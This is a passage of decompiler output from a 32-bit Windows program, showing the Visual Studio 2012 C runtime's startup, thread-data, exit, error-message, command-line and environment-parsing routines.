  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2012 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  _ptiddata _Memory;
  int iVar1;
  DWORD DVar2;
  
  dwErrCode = GetLastError();
  _Memory = (_ptiddata)FUN_00407878(DAT_0041a540);
  if (_Memory == (_ptiddata)0x0) {
    _Memory = (_ptiddata)__calloc_crt(1,0x3bc);
    if (_Memory != (_ptiddata)0x0) {
      iVar1 = FUN_00407897(DAT_0041a540,_Memory);
      if (iVar1 == 0) {
        FID_conflict__free(_Memory);
        _Memory = (_ptiddata)0x0;
      }
      else {
        FUN_0040b518((int)_Memory,0);
        DVar2 = GetCurrentThreadId();
        _Memory->_thandle = 0xffffffff;
        _Memory->_tid = DVar2;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Memory;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __cdecl FUN_0040b518(int param_1,int param_2)

{
  *(undefined **)(param_1 + 0x5c) = &DAT_00414538;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x14) = 1;
  *(undefined4 *)(param_1 + 0x70) = 1;
  *(undefined2 *)(param_1 + 0xb8) = 0x43;
  *(undefined2 *)(param_1 + 0x1be) = 0x43;
  *(undefined **)(param_1 + 0x68) = &DAT_0041a8a8;
  *(undefined4 *)(param_1 + 0x3b8) = 0;
  __lock(0xd);
  InterlockedIncrement(*(LONG **)(param_1 + 0x68));
  FUN_0040b5b9();
  __lock(0xc);
  *(int *)(param_1 + 0x6c) = param_2;
  if (param_2 == 0) {
    *(undefined **)(param_1 + 0x6c) = PTR_DAT_0041ac3c;
  }
  ___addlocaleref(*(LONG **)(param_1 + 0x6c));
  FUN_0040b5c2();
  return;
}



void FUN_0040b5b9(void)

{
  FUN_0040ed0f(0xd);
  return;
}



void FUN_0040b5c2(void)

{
  FUN_0040ed0f(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2012 Release

int __cdecl __mtinit(void)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD DVar3;
  
  FUN_0040b835();
  iVar1 = __mtinitlocks();
  if (iVar1 != 0) {
    DAT_0041a540 = FUN_0040783b(&LAB_0040b35a);
    if (DAT_0041a540 != 0xffffffff) {
      pDVar2 = (DWORD *)__calloc_crt(1,0x3bc);
      if (pDVar2 != (DWORD *)0x0) {
        iVar1 = FUN_00407897(DAT_0041a540,pDVar2);
        if (iVar1 != 0) {
          FUN_0040b518((int)pDVar2,0);
          DVar3 = GetCurrentThreadId();
          pDVar2[1] = 0xffffffff;
          *pDVar2 = DVar3;
          return 1;
        }
      }
      __mtterm();
      return 0;
    }
  }
  __mtterm();
  return 0;
}



// Library Function - Single Match
//  __mtterm
// 
// Library: Visual Studio 2012 Release

void __cdecl __mtterm(void)

{
  if (DAT_0041a540 != 0xffffffff) {
    FUN_00407859(DAT_0041a540);
    DAT_0041a540 = 0xffffffff;
  }
  __mtdeletelocks();
  return;
}



// Library Function - Single Match
//  ___copy_path_to_wide_string
// 
// Library: Visual Studio 2012 Release

BOOL __cdecl ___copy_path_to_wide_string(char *_Str,wchar_t **_WStr)

{
  bool bVar1;
  int *piVar2;
  undefined3 extraout_var;
  BOOL BVar3;
  int iVar4;
  DWORD DVar5;
  LPWSTR lpWideCharStr;
  UINT CodePage;
  
  CodePage = 0;
  if ((_Str == (char *)0x0) || (_WStr == (wchar_t **)0x0)) {
    piVar2 = __errno();
    BVar3 = 0x16;
    *piVar2 = 0x16;
    FUN_00407ceb();
  }
  else {
    bVar1 = FUN_004078da();
    if ((CONCAT31(extraout_var,bVar1) == 0) && (BVar3 = AreFileApisANSI(), BVar3 == 0)) {
      CodePage = 1;
    }
    *_WStr = (wchar_t *)0x0;
    iVar4 = MultiByteToWideChar(CodePage,0,_Str,-1,(LPWSTR)0x0,0);
    if (iVar4 == 0) {
      DVar5 = GetLastError();
      FID_conflict___dosmaperr(DVar5);
    }
    else {
      lpWideCharStr = (LPWSTR)__malloc_crt(iVar4 * 2);
      *_WStr = lpWideCharStr;
      if (lpWideCharStr != (LPWSTR)0x0) {
        iVar4 = MultiByteToWideChar(CodePage,0,_Str,-1,lpWideCharStr,iVar4);
        if (iVar4 != 0) {
          return 1;
        }
        DVar5 = GetLastError();
        FID_conflict___dosmaperr(DVar5);
        FID_conflict__free(*_WStr);
        *_WStr = (wchar_t *)0x0;
      }
    }
    BVar3 = 0;
  }
  return BVar3;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Library: Visual Studio 2012 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  BOOL BVar1;
  FARPROC pFVar2;
  HMODULE local_8;
  
  BVar1 = GetModuleHandleExW(0,u_mscoree_dll_004145d8,&local_8);
  if (BVar1 != 0) {
    pFVar2 = GetProcAddress(local_8,s_CorExitProcess_004145f0);
    if (pFVar2 != (FARPROC)0x0) {
      (*pFVar2)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2012 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2012 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  __exit(0xff);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2012 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2012 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  code **ppcVar3;
  
  if (DAT_0041cf70 != (code *)0x0) {
    BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041cf70);
    if (BVar1 != 0) {
      (*DAT_0041cf70)(param_1);
    }
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_004141e8,(undefined **)&DAT_00414200);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_0040c2fd);
    for (ppcVar3 = (code **)&DAT_004141e0; ppcVar3 < &DAT_004141e4; ppcVar3 = ppcVar3 + 1) {
      if (*ppcVar3 != (code *)0x0) {
        (**ppcVar3)();
      }
    }
    if (DAT_0041cf64 != (code *)0x0) {
      BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041cf64);
      if (BVar1 != 0) {
        (*DAT_0041cf64)(0,2,0);
      }
    }
    iVar2 = 0;
  }
  return iVar2;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2012 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



void FUN_0040b835(void)

{
  PVOID pvVar1;
  
  pvVar1 = EncodePointer((PVOID)0x0);
  FUN_0040c524(pvVar1);
  FUN_00407cb3(pvVar1);
  FUN_0041018d(pvVar1);
  FUN_0041019a(pvVar1);
  FUN_004101b4(pvVar1);
  FUN_00410042();
  FUN_00407918();
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2012 Release

void __cdecl __initterm(undefined **param_1,undefined **param_2)

{
  for (; param_1 < param_2; param_1 = (code **)param_1 + 1) {
    if ((code *)*param_1 != (code *)0x0) {
      (*(code *)*param_1)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2012 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



void FUN_0040b8ab(void)

{
  __lock(8);
  return;
}



void FUN_0040b8b4(void)

{
  FUN_0040ed0f(8);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040b9dd)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2012 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  PVOID *ppvVar1;
  PVOID pvVar2;
  code *pcVar3;
  PVOID *ppvVar4;
  PVOID *ppvVar5;
  PVOID *ppvVar6;
  PVOID *local_20;
  
  __lock(8);
  pcVar3 = DecodePointer_exref;
  if (DAT_0041b264 != 1) {
    _DAT_0041b258 = 1;
    DAT_0041b254 = (undefined)param_3;
    if (param_2 == 0) {
      local_20 = (PVOID *)DecodePointer(DAT_0041cf6c);
      if (local_20 != (PVOID *)0x0) {
        ppvVar1 = (PVOID *)DecodePointer(DAT_0041cf68);
        ppvVar6 = ppvVar1;
        while (ppvVar1 = ppvVar1 + -1, local_20 <= ppvVar1) {
          pvVar2 = EncodePointer((PVOID)0x0);
          if (*ppvVar1 != pvVar2) {
            if (ppvVar1 < local_20) break;
            pcVar3 = (code *)(*pcVar3)(*ppvVar1);
            pvVar2 = EncodePointer((PVOID)0x0);
            *ppvVar1 = pvVar2;
            (*pcVar3)();
            pcVar3 = DecodePointer_exref;
            ppvVar4 = (PVOID *)DecodePointer(DAT_0041cf6c);
            ppvVar5 = (PVOID *)DecodePointer(DAT_0041cf68);
            if ((local_20 != ppvVar4) || (ppvVar6 != ppvVar5)) {
              ppvVar1 = ppvVar5;
              local_20 = ppvVar4;
              ppvVar6 = ppvVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_00414204,(undefined **)&DAT_00414214);
    }
    __initterm((undefined **)&DAT_00414218,(undefined **)&DAT_0041421c);
  }
  FUN_0040b9d7();
  if (param_3 == 0) {
    DAT_0041b264 = 1;
    FUN_0040ed0f(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_0040b9d7(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040ed0f(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2012 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2012 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_0041b288 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



// Library Function - Single Match
//  __GET_RTERRMSG
// 
// Library: Visual Studio 2012 Release

wchar_t * __cdecl __GET_RTERRMSG(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00414e88)[uVar1 * 2]) {
      return (wchar_t *)(&PTR_u_R6002___floating_point_support_n_00414e8c)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x17);
  return (wchar_t *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2012 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  wchar_t *_Src;
  int iVar1;
  errno_t eVar2;
  DWORD DVar3;
  size_t sVar4;
  HANDLE hFile;
  uint uVar5;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_200;
  char local_1fc [500];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  _Src = __GET_RTERRMSG(param_1);
  if (_Src != (wchar_t *)0x0) {
    iVar1 = __set_error_mode(3);
    if ((iVar1 == 1) || ((iVar1 = __set_error_mode(3), iVar1 == 0 && (DAT_0041b288 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        uVar5 = 0;
        do {
          local_1fc[uVar5] = *(char *)(_Src + uVar5);
          if (_Src[uVar5] == L'\0') break;
          uVar5 = uVar5 + 1;
        } while (uVar5 < 500);
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &local_200;
        local_1fc[499] = 0;
        sVar4 = _strlen(local_1fc);
        WriteFile(hFile,local_1fc,sVar4,lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
      eVar2 = _wcscpy_s((wchar_t *)&DAT_0041b290,0x314,u_Runtime_Error__Program__00414f9c);
      if (eVar2 == 0) {
        _DAT_0041b4ca = 0;
        DVar3 = GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_0041b2c2,0x104);
        if ((DVar3 != 0) ||
           (eVar2 = _wcscpy_s((wchar_t *)&DAT_0041b2c2,0x2fb,u_<program_name_unknown>_00414fd0),
           eVar2 == 0)) {
          sVar4 = _wcslen((wchar_t *)&DAT_0041b2c2);
          if (0x3c < sVar4 + 1) {
            sVar4 = _wcslen((wchar_t *)&DAT_0041b2c2);
            eVar2 = _wcsncpy_s((wchar_t *)(&DAT_0041b24c + sVar4 * 2),
                               0x2fb - ((int)(sVar4 * 2 + -0x76) >> 1),(wchar_t *)&DAT_00415000,3);
            if (eVar2 != 0) goto LAB_0040bc0d;
          }
          eVar2 = _wcscat_s((wchar_t *)&DAT_0041b290,0x314,(wchar_t *)&DAT_00415008);
          if ((eVar2 == 0) && (eVar2 = _wcscat_s((wchar_t *)&DAT_0041b290,0x314,_Src), eVar2 == 0))
          {
            ___crtMessageBoxW((LPCWSTR)&DAT_0041b290,u_Microsoft_Visual_C___Runtime_Lib_00415010,
                              0x12010);
            goto LAB_0040bbff;
          }
        }
      }
LAB_0040bc0d:
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
  }
LAB_0040bbff:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



bool FUN_0040bc18(void)

{
  DAT_0041b8b8 = GetProcessHeap();
  return DAT_0041b8b8 != (HANDLE)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0040bc2d(void)

{
  uint uVar1;
  byte bVar2;
  undefined4 uVar3;
  DWORD DVar4;
  HANDLE pvVar5;
  int iVar6;
  int iVar7;
  HANDLE *ppvVar8;
  _STARTUPINFOW local_78;
  int local_34;
  uint local_30;
  int *local_2c;
  HANDLE *local_28;
  HANDLE *local_24;
  int local_20;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00418f88;
  uStack_c = 0x40bc39;
  __lock(0xb);
  iVar7 = 0;
  local_8 = (undefined *)0x0;
  local_28 = (HANDLE *)__calloc_crt(0x20,0x40);
  if (local_28 == (HANDLE *)0x0) {
    __local_unwind4(&DAT_0041a038,(int)local_14,0xfffffffe);
    uVar3 = 0xffffffff;
  }
  else {
    DAT_0041cf60 = 0x20;
    DAT_0041b8c0 = local_28;
    for (; local_28 < DAT_0041b8c0 + 0x200; local_28 = local_28 + 0x10) {
      *(undefined2 *)(local_28 + 1) = 0xa00;
      *local_28 = (HANDLE)0xffffffff;
      local_28[2] = (HANDLE)0x0;
      *(byte *)(local_28 + 9) = *(byte *)(local_28 + 9) & 0x80;
      *(byte *)(local_28 + 9) = *(byte *)(local_28 + 9) & 0x7f;
      *(undefined2 *)((int)local_28 + 0x25) = 0xa0a;
      local_28[0xe] = (HANDLE)0x0;
      *(undefined *)(local_28 + 0xd) = 0;
    }
    GetStartupInfoW(&local_78);
    if ((local_78.cbReserved2 != 0) && ((int *)local_78.lpReserved2 != (int *)0x0)) {
      local_20 = *(int *)local_78.lpReserved2;
      local_2c = (int *)((int)local_78.lpReserved2 + 4);
      local_24 = (HANDLE *)((int)local_2c + local_20);
      if (0x7ff < local_20) {
        local_20 = 0x800;
      }
      local_34 = 1;
      while (iVar6 = local_34, DAT_0041cf60 < local_20) {
        local_28 = (HANDLE *)__calloc_crt(0x20,0x40);
        if (local_28 == (HANDLE *)0x0) {
          local_20 = DAT_0041cf60;
          break;
        }
        (&DAT_0041b8c0)[iVar6] = local_28;
        DAT_0041cf60 = DAT_0041cf60 + 0x20;
        for (; local_28 < (HANDLE *)((int)(&DAT_0041b8c0)[iVar6] + 0x800);
            local_28 = local_28 + 0x10) {
          *(undefined2 *)(local_28 + 1) = 0xa00;
          *local_28 = (HANDLE)0xffffffff;
          local_28[2] = (HANDLE)0x0;
          *(byte *)(local_28 + 9) = *(byte *)(local_28 + 9) & 0x80;
          *(undefined2 *)((int)local_28 + 0x25) = 0xa0a;
          local_28[0xe] = (HANDLE)0x0;
          *(undefined *)(local_28 + 0xd) = 0;
        }
        local_34 = iVar6 + 1;
      }
      local_30 = 0;
      iVar6 = local_20;
      while (uVar1 = local_30, (int)local_30 < iVar6) {
        pvVar5 = *local_24;
        if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
            ((*(byte *)local_2c & 1) != 0)) &&
           (((*(byte *)local_2c & 8) != 0 ||
            (DVar4 = GetFileType(pvVar5), iVar6 = local_20, DVar4 != 0)))) {
          ppvVar8 = (HANDLE *)((uVar1 & 0x1f) * 0x40 + (int)(&DAT_0041b8c0)[(int)uVar1 >> 5]);
          *ppvVar8 = *local_24;
          *(byte *)(ppvVar8 + 1) = *(byte *)local_2c;
          local_28 = ppvVar8;
          InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          iVar6 = local_20;
        }
        local_2c = (int *)((int)local_2c + 1);
        local_24 = local_24 + 1;
        local_30 = uVar1 + 1;
      }
    }
    for (; local_30 = iVar7, iVar7 < 3; iVar7 = iVar7 + 1) {
      ppvVar8 = DAT_0041b8c0 + iVar7 * 0x10;
      local_28 = ppvVar8;
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar7 == 0) {
          DVar4 = 0xfffffff6;
        }
        else {
          DVar4 = 0xfffffff5 - (iVar7 != 1);
        }
        pvVar5 = GetStdHandle(DVar4);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar4 = GetFileType(pvVar5), DVar4 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
          if (DAT_0041cf80 != 0) {
            *(undefined4 *)(*(int *)(DAT_0041cf80 + iVar7 * 4) + 0x10) = 0xfffffffe;
          }
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar4 & 0xff) == 2) {
            bVar2 = *(byte *)(ppvVar8 + 1) | 0x40;
LAB_0040be7f:
            *(byte *)(ppvVar8 + 1) = bVar2;
          }
          else if ((DVar4 & 0xff) == 3) {
            bVar2 = *(byte *)(ppvVar8 + 1) | 8;
            goto LAB_0040be7f;
          }
          InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
    }
    local_8 = (undefined *)0xfffffffe;
    FUN_0040bed2();
    uVar3 = 0;
  }
  return uVar3;
}



void FUN_0040bed2(void)

{
  FUN_0040ed0f(0xb);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2012 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  short *psVar3;
  uint local_c;
  uint local_8;
  
  _DAT_0041bbc8 = 0;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_0041b9c0,0x104);
  _DAT_0041b280 = &DAT_0041b9c0;
  if ((DAT_0041e018 == (short *)0x0) || (psVar3 = DAT_0041e018, *DAT_0041e018 == 0)) {
    psVar3 = (short *)&DAT_0041b9c0;
  }
  _wparse_cmdline(psVar3,(short **)0x0,(short *)0x0,(int *)&local_8,(int *)&local_c);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (local_c < 0x7fffffff)) &&
      (_Size = (local_c + local_8 * 2) * 2, local_c * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(psVar3,ppsVar2,(short *)(ppsVar2 + uVar1),(int *)&local_8,(int *)&local_c);
    _DAT_0041b268 = local_8 - 1;
    _DAT_0041b270 = ppsVar2;
    return 0;
  }
  return -1;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2012 Release

void __cdecl
_wparse_cmdline(short *param_1,short **param_2,short *param_3,int *param_4,int *param_5)

{
  bool bVar1;
  bool bVar2;
  short sVar3;
  uint uVar4;
  
  bVar1 = false;
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (short **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  do {
    if (*param_1 == 0x22) {
      bVar1 = !bVar1;
      sVar3 = 0x22;
    }
    else {
      *param_5 = *param_5 + 1;
      if (param_3 != (short *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      sVar3 = *param_1;
      if (sVar3 == 0) goto LAB_0040c014;
    }
    param_1 = param_1 + 1;
  } while ((bVar1) || ((sVar3 != 0x20 && (sVar3 != 9))));
  if (param_3 != (short *)0x0) {
    param_3[-1] = 0;
  }
LAB_0040c014:
  bVar1 = false;
  while (*param_1 != 0) {
    for (; (*param_1 == 0x20 || (*param_1 == 9)); param_1 = param_1 + 1) {
    }
    if (*param_1 == 0) break;
    if (param_2 != (short **)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      uVar4 = 0;
      bVar2 = true;
      for (; *param_1 == 0x5c; param_1 = param_1 + 1) {
        uVar4 = uVar4 + 1;
      }
      if (*param_1 == 0x22) {
        if ((uVar4 & 1) == 0) {
          if ((bVar1) && (param_1[1] == 0x22)) {
            param_1 = param_1 + 1;
          }
          else {
            bVar2 = false;
            bVar1 = !bVar1;
          }
        }
        uVar4 = uVar4 >> 1;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if (param_3 != (short *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      sVar3 = *param_1;
      if ((sVar3 == 0) || ((!bVar1 && ((sVar3 == 0x20 || (sVar3 == 9)))))) break;
      if (bVar2) {
        if (param_3 != (short *)0x0) {
          *param_3 = sVar3;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      param_1 = param_1 + 1;
    }
    if (param_3 != (short *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (param_2 != (short **)0x0) {
    *param_2 = (short *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2012 Release

int __cdecl __wsetenvp(void)

{
  wchar_t wVar1;
  size_t sVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  wchar_t **ppwVar6;
  
  iVar5 = 0;
  pwVar4 = DAT_0041b244;
  if (DAT_0041b244 != (wchar_t *)0x0) {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + sVar2 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      sVar2 = _wcslen(pwVar4);
    }
    DAT_0041b278 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    if (DAT_0041b278 != (wchar_t **)0x0) {
      wVar1 = *DAT_0041b244;
      ppwVar6 = DAT_0041b278;
      pwVar4 = DAT_0041b244;
      do {
        if (wVar1 == L'\0') {
          FID_conflict__free(DAT_0041b244);
          DAT_0041b244 = (wchar_t *)0x0;
          *ppwVar6 = (wchar_t *)0x0;
          _DAT_0041cf78 = 1;
          return 0;
        }
        sVar2 = _wcslen(pwVar4);
        sVar2 = sVar2 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(sVar2,2);
          *ppwVar6 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            FID_conflict__free(DAT_0041b278);
            DAT_0041b278 = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,sVar2,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar6 = ppwVar6 + 1;
        }
        pwVar4 = pwVar4 + sVar2;
        wVar1 = *pwVar4;
      } while( true );
    }
  }
  return -1;
}



void __cdecl FUN_0040c1f6(undefined4 param_1)

{
  DAT_0041b288 = param_1;
  return;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2012 Release

int __cdecl __set_error_mode(int _Mode)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = DAT_0041bbcc;
  if (_Mode < 0) {
LAB_0040c22e:
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_00407ceb();
    return -1;
  }
  if (_Mode < 3) {
    DAT_0041bbcc = _Mode;
  }
  else if (_Mode != 3) goto LAB_0040c22e;
  return iVar1;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2012 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  LARGE_INTEGER local_18;
  _FILETIME local_10;
  uint local_8;
  
  local_10.dwLowDateTime = 0;
  local_10.dwHighDateTime = 0;
  if ((DAT_0041a038 == 0xbb40e64e) || ((DAT_0041a038 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_10);
    local_8 = local_10.dwHighDateTime ^ local_10.dwLowDateTime;
    DVar1 = GetCurrentThreadId();
    local_8 = local_8 ^ DVar1;
    DVar1 = GetCurrentProcessId();
    local_8 = local_8 ^ DVar1;
    QueryPerformanceCounter(&local_18);
    DAT_0041a038 = local_18.s.HighPart ^ local_18.s.LowPart ^ local_8 ^ (uint)&local_8;
    if (DAT_0041a038 == 0xbb40e64e) {
      DAT_0041a038 = 0xbb40e64f;
    }
    else if ((DAT_0041a038 & 0xffff0000) == 0) {
      DAT_0041a038 = DAT_0041a038 | (DAT_0041a038 | 0x4711) << 0x10;
    }
    DAT_0041a03c = ~DAT_0041a038;
  }
  else {
    DAT_0041a03c = ~DAT_0041a038;
  }
  return;
}



void FUN_0040c2dd(void)

{
  code **ppcVar1;
  
  for (ppcVar1 = (code **)&DAT_00418d10; ppcVar1 < &DAT_00418d10; ppcVar1 = ppcVar1 + 1) {
    if (*ppcVar1 != (code *)0x0) {
      (**ppcVar1)();
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2012 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  LPWCH _Dst;
  LPWCH pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  WCHAR *pWVar4;
  
  _Src = GetEnvironmentStringsW();
  pWVar2 = _Src;
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar4 = pWVar3;
        pWVar3 = pWVar4 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar4 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
    _Dst = (LPWCH)__malloc_crt(_Size);
    pWVar2 = (LPWCH)0x0;
    if (_Dst != (LPWCH)0x0) {
      FID_conflict__memcpy(_Dst,_Src,_Size);
      pWVar2 = _Dst;
    }
    FreeEnvironmentStringsW(_Src);
  }
  return pWVar2;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2012 Release

ushort * __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_0041e018;
  if (DAT_0041e018 == (ushort *)0x0) {
    puVar3 = &DAT_0041884c;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return puVar3;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return puVar3;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Removing unreachable block (ram,0x0040c4af)
// WARNING: Removing unreachable block (ram,0x0040c47f)
// WARNING: Removing unreachable block (ram,0x0040c3f5)
// WARNING: Removing unreachable block (ram,0x0040c453)
// Library Function - Single Match
//  ___isa_available_init
